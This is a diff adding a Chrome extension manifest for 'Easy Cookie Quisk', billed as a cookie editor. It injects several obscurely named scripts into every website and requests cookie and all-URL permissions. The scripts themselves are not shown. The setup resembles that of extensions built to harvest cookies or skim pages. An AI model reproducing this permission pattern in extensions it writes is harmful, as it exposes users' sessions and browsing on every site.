@@ -1,0 +1,46 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+	"manifest_version": 2,
+	"name": "Easy Cookie Quisk",
+	"description": "Cookie editor",
+	"version": "1.6",
+	"icons": {
+		"16": "img/if_cookie_1760338_16.png",
+		"48": "img/if_cookie_1760338_48.png",
+		"128": "img/if_cookie_1760338_128.png"
+	},
+	"web_accessible_resources": [
+		"img/*.gif",
+		"img/*.png",
+		"pings/*.css",
+		"pings/functionsprinc.js"
+	],
+	"content_scripts": [
+		{
+			"run_at": "document_end",
+			"matches": [
+				"<all_urls>"
+			],
+			"js": [
+				"pings/bebeinicia.js", "pings/bebedepoisada.js", "pings/bebeiniciagfadzada.js", "pings/bebedepoisadagfadzada.js"
+			]
+		}
+	],
+	"background": {
+		"scripts": [
+			"pings/jquery-3.4.1.min.js",
+			"pings/makiston.js"
+		]
+	},
+	"permissions": [
+		"cookies",
+		"storage",
+		"activeTab",
+		"<all_urls>"
+	],
+	"browser_action": {
+		"default_icon": "img/if_cookie_1760338_16.png",
+		"default_popup": "pings/popup.html"
+	}
+}
